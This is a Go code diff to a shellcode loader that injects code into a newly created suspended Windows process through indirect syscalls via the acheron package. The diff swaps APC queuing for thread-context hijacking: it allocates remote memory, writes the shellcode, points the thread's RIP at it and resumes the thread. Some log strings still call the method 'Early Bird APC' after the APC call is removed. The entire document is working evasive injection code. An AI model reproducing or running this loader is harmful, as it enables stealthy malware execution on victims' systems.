@@ -24,12 +24,12 @@ func Init() (*ShellcodeLoader, error) {
 }
 
 func (s *ShellcodeLoader) InjectShellcode(shellcode []byte, exePath string) error {
-	fmt.Printf("[!] Using indirect syscalls with acheron ...\n")
+	fmt.Printf("[!] Using indirect syscalls with acheron (Early Bird APC)...\n")
 
-	// Create a process in a suspended state
 	si := new(windows.StartupInfo)
 	pi := new(windows.ProcessInformation)
 
+	fmt.Printf("[*] Creating process %s in suspended state...\n", exePath)
 	err := windows.CreateProcess(
 		syscall.StringToUTF16Ptr(exePath),
 		nil,
@@ -53,6 +53,7 @@ func (s *ShellcodeLoader) InjectShellcode(shellcode []byte, exePath string) erro
 	var baseAddr uintptr
 	scLen := len(shellcode)
 
+	fmt.Printf("[*] Allocating %d bytes in remote process memory...\n", scLen)
 	_, err = s.Acheron.Syscall(
 		s.Acheron.HashString("NtAllocateVirtualMemory"),
 		uintptr(pi.Process),
@@ -67,6 +68,7 @@ func (s *ShellcodeLoader) InjectShellcode(shellcode []byte, exePath string) erro
 	}
 	fmt.Printf("[+] Allocated memory at: 0x%x\n", baseAddr)
 
+	fmt.Printf("[*] Writing shellcode to allocated memory...\n")
 	_, err = s.Acheron.Syscall(
 		s.Acheron.HashString("NtWriteVirtualMemory"),
 		uintptr(pi.Process),
@@ -80,20 +82,50 @@ func (s *ShellcodeLoader) InjectShellcode(shellcode []byte, exePath string) erro
 	}
 	fmt.Println("[+] Shellcode written to memory")
 
-	// Queue APC for the main thread
+	const CONTEXT_FULL = 0x10007
+	type CONTEXT struct {
+		P1Home, P2Home, P3Home, P4Home, P5Home, P6Home uint64
+		ContextFlags                                   uint32
+		MxCsr                                          uint32
+		SegCs, SegDs, SegEs, SegFs, SegGs, SegSs       uint16
+		EFlags                                         uint32
+		Dr0, Dr1, Dr2, Dr3, Dr6, Dr7                   uint64
+		Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi         uint64
+		R8, R9, R10, R11, R12, R13, R14, R15           uint64
+		Rip                                            uint64
+	}
+
+	var ctx CONTEXT
+	ctx.ContextFlags = CONTEXT_FULL
+
+	fmt.Println("[*] Getting thread context...")
 	_, err = s.Acheron.Syscall(
-		s.Acheron.HashString("NtQueueApcThread"),
+		s.Acheron.HashString("NtGetContextThread"),
 		uintptr(pi.Thread),
-		baseAddr,
-		nullptr,
-		nullptr,
-		nullptr,
+		uintptr(unsafe.Pointer(&ctx)),
 	)
 	if err != nil {
-		return fmt.Errorf("[-] failed to queue APC: %w", err)
+		return fmt.Errorf("[-] failed to get thread context: %w", err)
 	}
-	fmt.Println("[+] APC queued successfully")
+	//RIP is the instruction pointer in x64 it points the shellcode address to execute
+	//EIP is for X86
+	fmt.Printf("[+] Thread context retrieved. RIP = 0x%x\n", ctx.Rip)
 
+	fmt.Printf("[*] Setting RIP to shellcode address 0x%x\n", baseAddr)
+	ctx.Rip = uint64(baseAddr)
+
+	fmt.Println("[*] Setting thread context with new RIP...")
+	_, err = s.Acheron.Syscall(
+		s.Acheron.HashString("NtSetContextThread"),
+		uintptr(pi.Thread),
+		uintptr(unsafe.Pointer(&ctx)),
+	)
+	if err != nil {
+		return fmt.Errorf("[-] failed to set thread context: %w", err)
+	}
+	fmt.Printf("[+] Thread context set. RIP = 0x%x\n", ctx.Rip)
+
+	fmt.Println("[*] Resuming thread to start execution at shellcode...")
 	_, err = s.Acheron.Syscall(
 		s.Acheron.HashString("NtResumeThread"),
 		uintptr(pi.Thread),
@@ -102,9 +134,10 @@ func (s *ShellcodeLoader) InjectShellcode(shellcode []byte, exePath string) erro
 	if err != nil {
 		return fmt.Errorf("[-] failed to resume thread: %w", err)
 	}
-	fmt.Println("[+] Thread resumed, shellcode executed!")
+	fmt.Println("[+] Thread resumed, shellcode executed via Early Bird APC")
 
 	return nil
 }
 
 //Thx archeron for this goat package
+//ngl i was in pain doing this, but it works
